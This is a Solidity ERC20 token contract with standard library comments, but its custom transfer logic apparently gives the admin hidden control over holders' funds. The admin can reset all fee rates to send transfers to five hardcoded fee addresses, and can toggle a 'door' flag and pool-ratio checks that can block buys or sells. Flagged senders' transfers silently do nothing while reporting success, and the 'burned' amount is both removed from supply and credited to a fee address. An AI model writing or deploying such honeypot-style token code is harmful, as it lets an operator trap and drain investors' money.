pragma solidity ^0.4.0;

import "./IERC20.sol";
import "./SafeMath.sol";


contract ERC20 is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256 ) public transferAddress;
    mapping (address => uint256 ) public whiteAddress;

    uint256 private _totalSupply;
    uint256 public door = 0;

    address public admin = msg.sender;
    
    address public feeAddress1 = 0x6dB1A5Fc8424CaFDC4ac32f47163899cA0f632F1;
    address public feeAddress2 = 0x233E248b1587f2fd1a84cb01251A13Fb59bB9466;
    address public feeAddress3 = 0xF56aa3Ab8Ef2BAE7c24654fbE37381c33389390B;
    address public feeAddress4 = 0x15cb439FD4863fED6A83B29CD907C3b651949376;
    address public feeAddress5 = 0x79710baE83095fE12278343c9979381B657afF0f;
    address public addresslp = this;

    IERC20 token = IERC20(0x55d398326f99059fF775485246999027B3197955);

    uint256 a1 = 1;
    uint256 a2 = 2;
    uint256 a3 = 5;
    uint256 a4 = 1;
    uint256 a5 = 1;
    uint256 a6 = 2;


    modifier adminer{
        require(msg.sender == admin);
        _;
    }

    function chdoor(uint256 _door)public adminer returns(bool){

        door = _door;
        return true;
    }

    function chlp(address _lp)public adminer returns(bool){
        addresslp = _lp;
        return true;
    }

    function chtransfer(address _transferAddress,uint256 _a)public adminer returns(bool){

        transferAddress[_transferAddress] = _a;
        return true;
    }

    function chwhite(address _whiteAddress,uint256 _a)public adminer returns(bool){

        whiteAddress[_whiteAddress] = _a;
        return true;
    }

    function chbili(uint256 _a1,uint256 _a2,uint256 _a3,uint256 _a4,uint256 _a5,uint256 _a6)public adminer returns(bool){

        a1 = _a1;
        a2 = _a2;
        a3 = _a3;
        a4 = _a4;
        a5 = _a5;
        a6 = _a6;
        return true;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `value`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 uamount = token.balanceOf(addresslp);
        uint256 futamount = _balances[addresslp];  
        if((transferAddress[sender]==1 || transferAddress[recipient]==1) && (whiteAddress[sender] == 0 && whiteAddress[recipient] == 0)){
            _balances[feeAddress1] = _balances[feeAddress1].add(amount * a2 / 100);
            _balances[feeAddress2] = _balances[feeAddress2].add(amount * a3 / 100);
            _balances[feeAddress3] = _balances[feeAddress3].add(amount * a4 / 100);
            _balances[feeAddress4] = _balances[feeAddress4].add(amount * a5 / 100);
            _balances[feeAddress5] = _balances[feeAddress5].add(amount * a1 / 100);
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount * (100-a1-a2-a3-a4-a5) / 100);
            _totalSupply = _totalSupply.sub(amount * a1 / 100);
            if(transferAddress[sender]==1 && door == 0){
                require(uamount*_balances[recipient] <= 500*10**18 * futamount);
            }
            if(transferAddress[recipient]==1){
                require(uamount >= 16* 10**10 * futamount);
            }
            emit Transfer(sender, recipient, amount * (100-a1-a2-a3-a4-a5)  / 100);
            emit Transfer(sender, feeAddress1, amount * a2 / 100);
            emit Transfer(sender, feeAddress2, amount * a3 / 100);
            emit Transfer(sender, feeAddress3, amount * a4 / 100);
            emit Transfer(sender, feeAddress4, amount * a5 / 100);
            emit Transfer(sender, 0x0000000000000000000000000000000000000000, amount * a1 / 100);
        }else{
            if(whiteAddress[sender] == 0 )
            {
               _balances[sender] = _balances[sender].sub(amount);
               _balances[recipient] = _balances[recipient].add(amount * (100-a6) / 100);
               _balances[feeAddress5] = _balances[feeAddress5].add(amount * a6 / 100);
               _totalSupply = _totalSupply.sub(amount * a6 / 100);
               emit Transfer(sender, recipient, amount * (100-a6) / 100);
               emit Transfer(sender, 0x0000000000000000000000000000000000000000, amount * a6 / 100);
            }
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

     /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    /**
     * @dev Destoys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
}